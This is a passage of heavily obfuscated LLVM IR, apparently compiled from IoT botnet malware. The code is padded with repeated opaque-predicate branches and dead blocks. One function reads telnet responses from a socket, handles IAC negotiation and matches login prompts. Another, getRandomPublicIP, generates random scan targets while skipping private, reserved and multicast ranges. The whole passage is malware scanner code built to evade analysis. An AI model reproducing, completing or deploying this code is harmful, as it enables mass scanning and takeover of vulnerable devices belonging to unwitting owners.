  %35 = load i32, i32* %21, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds %struct.timeval, %struct.timeval* %30, i32 0, i32 0
  store i64 %36, i64* %37, align 8
  %38 = load i32, i32* %22, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds %struct.timeval, %struct.timeval* %30, i32 0, i32 1
  store i64 %39, i64* %40, align 8
  store i8* null, i8** %31, align 8
  %41 = load i32, i32* @x.49
  %42 = load i32, i32* @y.50
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %49

; <label>:49:                                     ; preds = %264, %originalBBpart2
  %50 = load i32, i32* %26, align 4
  %51 = add nsw i32 %50, 2
  %52 = load i32, i32* %24, align 4
  %53 = icmp slt i32 %51, %52
  br i1 %53, label %54, label %64

; <label>:54:                                     ; preds = %49
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %30, i32 0, i32 0
  %56 = load i64, i64* %55, align 8
  %57 = icmp sgt i64 %56, 0
  br i1 %57, label %62, label %58

; <label>:58:                                     ; preds = %54
  %59 = getelementptr inbounds %struct.timeval, %struct.timeval* %30, i32 0, i32 1
  %60 = load i64, i64* %59, align 8
  %61 = icmp sgt i64 %60, 0
  br label %62

; <label>:62:                                     ; preds = %58, %54
  %63 = phi i1 [ true, %54 ], [ %61, %58 ]
  br label %64

; <label>:64:                                     ; preds = %62, %49
  %65 = phi i1 [ false, %49 ], [ %63, %62 ]
  %66 = load i32, i32* @x.49
  %67 = load i32, i32* @y.50
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %64
  %74 = load i32, i32* @x.49
  %75 = load i32, i32* @y.50
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %65, label %82, label %265

; <label>:82:                                     ; preds = %originalBBpart24
  br label %83

; <label>:83:                                     ; preds = %82
  %84 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %29, i32 0, i32 0
  %85 = getelementptr inbounds [16 x i64], [16 x i64]* %84, i64 0, i64 0
  %86 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %85) #2, !srcloc !4
  %87 = extractvalue { i64, i64* } %86, 0
  %88 = extractvalue { i64, i64* } %86, 1
  %89 = trunc i64 %87 to i32
  store i32 %89, i32* %32, align 4
  %90 = ptrtoint i64* %88 to i64
  %91 = trunc i64 %90 to i32
  store i32 %91, i32* %33, align 4
  br label %92

; <label>:92:                                     ; preds = %83
  %93 = load i32, i32* %18, align 4
  %94 = srem i32 %93, 64
  %95 = zext i32 %94 to i64
  %96 = shl i64 1, %95
  %97 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %29, i32 0, i32 0
  %98 = load i32, i32* %18, align 4
  %99 = sdiv i32 %98, 64
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds [16 x i64], [16 x i64]* %97, i64 0, i64 %100
  %102 = load i64, i64* %101, align 8
  %103 = or i64 %102, %96
  store i64 %103, i64* %101, align 8
  %104 = load i32, i32* %18, align 4
  %105 = add nsw i32 %104, 1
  %106 = call i32 @select(i32 %105, %struct.__sigset_t* %29, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %30)
  %107 = icmp slt i32 %106, 1
  br i1 %107, label %108, label %125

; <label>:108:                                    ; preds = %92
  %109 = load i32, i32* @x.49
  %110 = load i32, i32* @y.50
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %108
  %117 = load i32, i32* @x.49
  %118 = load i32, i32* @y.50
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %265

; <label>:125:                                    ; preds = %92
  %126 = load i8*, i8** %23, align 8
  %127 = load i32, i32* %26, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds i8, i8* %126, i64 %128
  store i8* %129, i8** %31, align 8
  %130 = load i32, i32* %18, align 4
  %131 = load i8*, i8** %31, align 8
  %132 = call i64 @recv(i32 %130, i8* %131, i64 1, i32 0)
  %133 = trunc i64 %132 to i32
  store i32 %133, i32* %27, align 4
  %134 = load i32, i32* %27, align 4
  %135 = icmp eq i32 %134, -1
  br i1 %135, label %155, label %136

; <label>:136:                                    ; preds = %125
  %137 = load i32, i32* @x.49
  %138 = load i32, i32* @y.50
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %136
  %145 = load i32, i32* %27, align 4
  %146 = icmp eq i32 %145, 0
  %147 = load i32, i32* @x.49
  %148 = load i32, i32* @y.50
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %146, label %155, label %172

; <label>:155:                                    ; preds = %originalBBpart212, %125
  %156 = load i32, i32* @x.49
  %157 = load i32, i32* @y.50
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %155
  store i32 0, i32* %17, align 4
  %164 = load i32, i32* @x.49
  %165 = load i32, i32* @y.50
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %270

; <label>:172:                                    ; preds = %originalBBpart212
  %173 = load i32, i32* %27, align 4
  %174 = load i32, i32* %26, align 4
  %175 = add nsw i32 %174, %173
  store i32 %175, i32* %26, align 4
  %176 = load i8*, i8** %31, align 8
  %177 = load i8, i8* %176, align 1
  %178 = zext i8 %177 to i32
  %179 = icmp eq i32 %178, 255
  br i1 %179, label %180, label %202

; <label>:180:                                    ; preds = %172
  %181 = load i32, i32* %18, align 4
  %182 = load i8*, i8** %31, align 8
  %183 = getelementptr inbounds i8, i8* %182, i64 1
  %184 = call i64 @recv(i32 %181, i8* %183, i64 2, i32 0)
  %185 = trunc i64 %184 to i32
  store i32 %185, i32* %27, align 4
  %186 = load i32, i32* %27, align 4
  %187 = icmp eq i32 %186, -1
  br i1 %187, label %191, label %188

; <label>:188:                                    ; preds = %180
  %189 = load i32, i32* %27, align 4
  %190 = icmp eq i32 %189, 0
  br i1 %190, label %191, label %192

; <label>:191:                                    ; preds = %188, %180
  store i32 0, i32* %17, align 4
  br label %270

; <label>:192:                                    ; preds = %188
  %193 = load i32, i32* %27, align 4
  %194 = load i32, i32* %26, align 4
  %195 = add nsw i32 %194, %193
  store i32 %195, i32* %26, align 4
  %196 = load i32, i32* %18, align 4
  %197 = load i8*, i8** %31, align 8
  %198 = call i32 @negotiate(i32 %196, i8* %197, i32 3)
  %199 = icmp ne i32 %198, 0
  br i1 %199, label %201, label %200

; <label>:200:                                    ; preds = %192
  store i32 0, i32* %17, align 4
  br label %270

; <label>:201:                                    ; preds = %192
  br label %264

; <label>:202:                                    ; preds = %172
  %203 = load i8*, i8** %23, align 8
  %204 = load i8*, i8** %19, align 8
  %205 = call i8* @strstr(i8* %203, i8* %204) #10
  %206 = icmp ne i8* %205, null
  br i1 %206, label %230, label %207

; <label>:207:                                    ; preds = %202
  %208 = load i32, i32* %20, align 4
  %209 = icmp ne i32 %208, 0
  br i1 %209, label %210, label %247

; <label>:210:                                    ; preds = %207
  %211 = load i32, i32* @x.49
  %212 = load i32, i32* @y.50
  %213 = sub i32 %211, 1
  %214 = mul i32 %211, %213
  %215 = urem i32 %214, 2
  %216 = icmp eq i32 %215, 0
  %217 = icmp slt i32 %212, 10
  %218 = or i1 %216, %217
  br i1 %218, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %210
  %219 = load i8*, i8** %23, align 8
  %220 = call i32 @matchPrompt(i8* %219)
  %221 = icmp ne i32 %220, 0
  %222 = load i32, i32* @x.49
  %223 = load i32, i32* @y.50
  %224 = sub i32 %222, 1
  %225 = mul i32 %222, %224
  %226 = urem i32 %225, 2
  %227 = icmp eq i32 %226, 0
  %228 = icmp slt i32 %223, 10
  %229 = or i1 %227, %228
  br i1 %229, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %221, label %230, label %247

; <label>:230:                                    ; preds = %originalBBpart220, %202
  %231 = load i32, i32* @x.49
  %232 = load i32, i32* @y.50
  %233 = sub i32 %231, 1
  %234 = mul i32 %231, %233
  %235 = urem i32 %234, 2
  %236 = icmp eq i32 %235, 0
  %237 = icmp slt i32 %232, 10
  %238 = or i1 %236, %237
  br i1 %238, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %230
  store i32 1, i32* %28, align 4
  %239 = load i32, i32* @x.49
  %240 = load i32, i32* @y.50
  %241 = sub i32 %239, 1
  %242 = mul i32 %239, %241
  %243 = urem i32 %242, 2
  %244 = icmp eq i32 %243, 0
  %245 = icmp slt i32 %240, 10
  %246 = or i1 %244, %245
  br i1 %246, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %265

; <label>:247:                                    ; preds = %originalBBpart220, %207
  %248 = load i32, i32* @x.49
  %249 = load i32, i32* @y.50
  %250 = sub i32 %248, 1
  %251 = mul i32 %248, %250
  %252 = urem i32 %251, 2
  %253 = icmp eq i32 %252, 0
  %254 = icmp slt i32 %249, 10
  %255 = or i1 %253, %254
  br i1 %255, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %247
  %256 = load i32, i32* @x.49
  %257 = load i32, i32* @y.50
  %258 = sub i32 %256, 1
  %259 = mul i32 %256, %258
  %260 = urem i32 %259, 2
  %261 = icmp eq i32 %260, 0
  %262 = icmp slt i32 %257, 10
  %263 = or i1 %261, %262
  br i1 %263, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %264

; <label>:264:                                    ; preds = %originalBBpart228, %201
  br label %49

; <label>:265:                                    ; preds = %originalBBpart224, %originalBBpart28, %originalBBpart24
  %266 = load i32, i32* %28, align 4
  %267 = icmp ne i32 %266, 0
  br i1 %267, label %268, label %269

; <label>:268:                                    ; preds = %265
  store i32 1, i32* %17, align 4
  br label %270

; <label>:269:                                    ; preds = %265
  store i32 0, i32* %17, align 4
  br label %270

; <label>:270:                                    ; preds = %269, %268, %200, %191, %originalBBpart216
  %271 = load i32, i32* %17, align 4
  ret i32 %271

originalBBalteredBB:                              ; preds = %originalBB, %8
  %272 = alloca i32, align 4
  %273 = alloca i32, align 4
  %274 = alloca i8*, align 8
  %275 = alloca i32, align 4
  %276 = alloca i32, align 4
  %277 = alloca i32, align 4
  %278 = alloca i8*, align 8
  %279 = alloca i32, align 4
  %280 = alloca i32, align 4
  %281 = alloca i32, align 4
  %282 = alloca i32, align 4
  %283 = alloca i32, align 4
  %284 = alloca %struct.__sigset_t, align 8
  %285 = alloca %struct.timeval, align 8
  %286 = alloca i8*, align 8
  %287 = alloca i32, align 4
  %288 = alloca i32, align 4
  store i32 %0, i32* %273, align 4
  store i8* %1, i8** %274, align 8
  store i32 %2, i32* %275, align 4
  store i32 %3, i32* %276, align 4
  store i32 %4, i32* %277, align 4
  store i8* %5, i8** %278, align 8
  store i32 %6, i32* %279, align 4
  store i32 %7, i32* %280, align 4
  %289 = load i32, i32* %280, align 4
  store i32 %289, i32* %281, align 4
  store i32 0, i32* %282, align 4
  store i32 0, i32* %283, align 4
  %290 = load i32, i32* %276, align 4
  %291 = sext i32 %290 to i64
  %292 = getelementptr inbounds %struct.timeval, %struct.timeval* %285, i32 0, i32 0
  store i64 %291, i64* %292, align 8
  %293 = load i32, i32* %277, align 4
  %294 = sext i32 %293 to i64
  %295 = getelementptr inbounds %struct.timeval, %struct.timeval* %285, i32 0, i32 1
  store i64 %294, i64* %295, align 8
  store i8* null, i8** %286, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %64
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %108
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %136
  %296 = load i32, i32* %27, align 4
  %297 = icmp eq i32 %296, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %155
  store i32 0, i32* %17, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %210
  %298 = load i8*, i8** %23, align 8
  %299 = call i32 @matchPrompt(i8* %298)
  %300 = icmp ne i32 %299, 0
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %230
  store i32 1, i32* %28, align 4
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %247
  br label %originalBB26
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %1 = load i32, i32* @x.51
  %2 = load i32, i32* @y.52
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca [16 x i8], align 16
  %11 = alloca [16 x i8], align 16
  %12 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %13 = zext i8 %12 to i32
  %14 = icmp sgt i32 %13, 0
  %15 = load i32, i32* @x.51
  %16 = load i32, i32* @y.52
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %14, label %23, label %43

; <label>:23:                                     ; preds = %originalBBpart2
  %24 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %25 = zext i8 %24 to i32
  %26 = icmp slt i32 %25, 255
  br i1 %26, label %27, label %43

; <label>:27:                                     ; preds = %23
  %28 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %29 = add i8 %28, 1
  store i8 %29, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %30 = bitcast [16 x i8]* %10 to i8*
  call void @llvm.memset.p0i8.i64(i8* %30, i8 0, i64 16, i32 16, i1 false)
  %31 = getelementptr inbounds [16 x i8], [16 x i8]* %10, i32 0, i32 0
  %32 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %33 = zext i8 %32 to i32
  %34 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %35 = zext i8 %34 to i32
  %36 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %37 = zext i8 %36 to i32
  %38 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %39 = zext i8 %38 to i32
  %40 = call i32 (i8*, i8*, ...) @szprintf(i8* %31, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.25, i32 0, i32 0), i32 %33, i32 %35, i32 %37, i32 %39)
  %41 = getelementptr inbounds [16 x i8], [16 x i8]* %10, i32 0, i32 0
  %42 = call i32 @inet_addr(i8* %41) #2
  store i32 %42, i32* %9, align 4
  br label %321

; <label>:43:                                     ; preds = %23, %originalBBpart2
  %44 = call i32 @rand() #2
  %45 = srem i32 %44, 255
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %47 = call i32 @rand() #2
  %48 = srem i32 %47, 255
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %50 = call i32 @rand() #2
  %51 = srem i32 %50, 255
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  br label %53

; <label>:53:                                     ; preds = %originalBBpart241, %43
  %54 = load i32, i32* @x.51
  %55 = load i32, i32* @y.52
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %53
  %62 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %63 = zext i8 %62 to i32
  %64 = icmp eq i32 %63, 0
  %65 = load i32, i32* @x.51
  %66 = load i32, i32* @y.52
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %64, label %249, label %73

; <label>:73:                                     ; preds = %originalBBpart24
  %74 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %75 = zext i8 %74 to i32
  %76 = icmp eq i32 %75, 10
  br i1 %76, label %249, label %77

; <label>:77:                                     ; preds = %73
  %78 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %79 = zext i8 %78 to i32
  %80 = icmp eq i32 %79, 100
  br i1 %80, label %81, label %89

; <label>:81:                                     ; preds = %77
  %82 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %83 = zext i8 %82 to i32
  %84 = icmp sge i32 %83, 64
  br i1 %84, label %85, label %89

; <label>:85:                                     ; preds = %81
  %86 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %87 = zext i8 %86 to i32
  %88 = icmp sle i32 %87, 127
  br i1 %88, label %249, label %89

; <label>:89:                                     ; preds = %85, %81, %77
  %90 = load i32, i32* @x.51
  %91 = load i32, i32* @y.52
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %89
  %98 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %99 = zext i8 %98 to i32
  %100 = icmp eq i32 %99, 127
  %101 = load i32, i32* @x.51
  %102 = load i32, i32* @y.52
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %100, label %249, label %109

; <label>:109:                                    ; preds = %originalBBpart28
  %110 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %111 = zext i8 %110 to i32
  %112 = icmp eq i32 %111, 169
  br i1 %112, label %113, label %117

; <label>:113:                                    ; preds = %109
  %114 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %115 = zext i8 %114 to i32
  %116 = icmp eq i32 %115, 254
  br i1 %116, label %249, label %117

; <label>:117:                                    ; preds = %113, %109
  %118 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %119 = zext i8 %118 to i32
  %120 = icmp eq i32 %119, 172
  br i1 %120, label %121, label %145

; <label>:121:                                    ; preds = %117
  %122 = load i32, i32* @x.51
  %123 = load i32, i32* @y.52
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %121
  %130 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %131 = zext i8 %130 to i32
  %132 = icmp sle i32 %131, 16
  %133 = load i32, i32* @x.51
  %134 = load i32, i32* @y.52
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %132, label %141, label %145

; <label>:141:                                    ; preds = %originalBBpart212
  %142 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %143 = zext i8 %142 to i32
  %144 = icmp sle i32 %143, 31
  br i1 %144, label %249, label %145

; <label>:145:                                    ; preds = %141, %originalBBpart212, %117
  %146 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %147 = zext i8 %146 to i32
  %148 = icmp eq i32 %147, 192
  br i1 %148, label %149, label %157

; <label>:149:                                    ; preds = %145
  %150 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %151 = zext i8 %150 to i32
  %152 = icmp eq i32 %151, 0
  br i1 %152, label %153, label %157

; <label>:153:                                    ; preds = %149
  %154 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %155 = zext i8 %154 to i32
  %156 = icmp eq i32 %155, 2
  br i1 %156, label %249, label %157

; <label>:157:                                    ; preds = %153, %149, %145
  %158 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %159 = zext i8 %158 to i32
  %160 = icmp eq i32 %159, 192
  br i1 %160, label %161, label %169

; <label>:161:                                    ; preds = %157
  %162 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %163 = zext i8 %162 to i32
  %164 = icmp eq i32 %163, 88
  br i1 %164, label %165, label %169

; <label>:165:                                    ; preds = %161
  %166 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %167 = zext i8 %166 to i32
  %168 = icmp eq i32 %167, 99
  br i1 %168, label %249, label %169

; <label>:169:                                    ; preds = %165, %161, %157
  %170 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %171 = zext i8 %170 to i32
  %172 = icmp eq i32 %171, 192
  br i1 %172, label %173, label %193

; <label>:173:                                    ; preds = %169
  %174 = load i32, i32* @x.51
  %175 = load i32, i32* @y.52
  %176 = sub i32 %174, 1
  %177 = mul i32 %174, %176
  %178 = urem i32 %177, 2
  %179 = icmp eq i32 %178, 0
  %180 = icmp slt i32 %175, 10
  %181 = or i1 %179, %180
  br i1 %181, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %173
  %182 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %183 = zext i8 %182 to i32
  %184 = icmp eq i32 %183, 168
  %185 = load i32, i32* @x.51
  %186 = load i32, i32* @y.52
  %187 = sub i32 %185, 1
  %188 = mul i32 %185, %187
  %189 = urem i32 %188, 2
  %190 = icmp eq i32 %189, 0
  %191 = icmp slt i32 %186, 10
  %192 = or i1 %190, %191
  br i1 %192, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %184, label %249, label %193

; <label>:193:                                    ; preds = %originalBBpart216, %169
  %194 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %195 = zext i8 %194 to i32
  %196 = icmp eq i32 %195, 198
  br i1 %196, label %197, label %205

; <label>:197:                                    ; preds = %193
  %198 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %199 = zext i8 %198 to i32
  %200 = icmp eq i32 %199, 18
  br i1 %200, label %249, label %201

; <label>:201:                                    ; preds = %197
  %202 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %203 = zext i8 %202 to i32
  %204 = icmp eq i32 %203, 19
  br i1 %204, label %249, label %205

; <label>:205:                                    ; preds = %201, %193
  %206 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %207 = zext i8 %206 to i32
  %208 = icmp eq i32 %207, 198
  br i1 %208, label %209, label %233

; <label>:209:                                    ; preds = %205
  %210 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %211 = zext i8 %210 to i32
  %212 = icmp eq i32 %211, 51
  br i1 %212, label %213, label %233

; <label>:213:                                    ; preds = %209
  %214 = load i32, i32* @x.51
  %215 = load i32, i32* @y.52
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %213
  %222 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %223 = zext i8 %222 to i32
  %224 = icmp eq i32 %223, 100
  %225 = load i32, i32* @x.51
  %226 = load i32, i32* @y.52
  %227 = sub i32 %225, 1
  %228 = mul i32 %225, %227
  %229 = urem i32 %228, 2
  %230 = icmp eq i32 %229, 0
  %231 = icmp slt i32 %226, 10
  %232 = or i1 %230, %231
  br i1 %232, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %224, label %249, label %233

; <label>:233:                                    ; preds = %originalBBpart220, %209, %205
  %234 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %235 = zext i8 %234 to i32
  %236 = icmp eq i32 %235, 203
  br i1 %236, label %237, label %245

; <label>:237:                                    ; preds = %233
  %238 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %239 = zext i8 %238 to i32
  %240 = icmp eq i32 %239, 0
  br i1 %240, label %241, label %245

; <label>:241:                                    ; preds = %237
  %242 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %243 = zext i8 %242 to i32
  %244 = icmp eq i32 %243, 113
  br i1 %244, label %249, label %245

; <label>:245:                                    ; preds = %241, %237, %233
  %246 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %247 = zext i8 %246 to i32
  %248 = icmp sge i32 %247, 224
  br label %249

; <label>:249:                                    ; preds = %245, %241, %originalBBpart220, %201, %197, %originalBBpart216, %165, %153, %141, %113, %originalBBpart28, %85, %73, %originalBBpart24
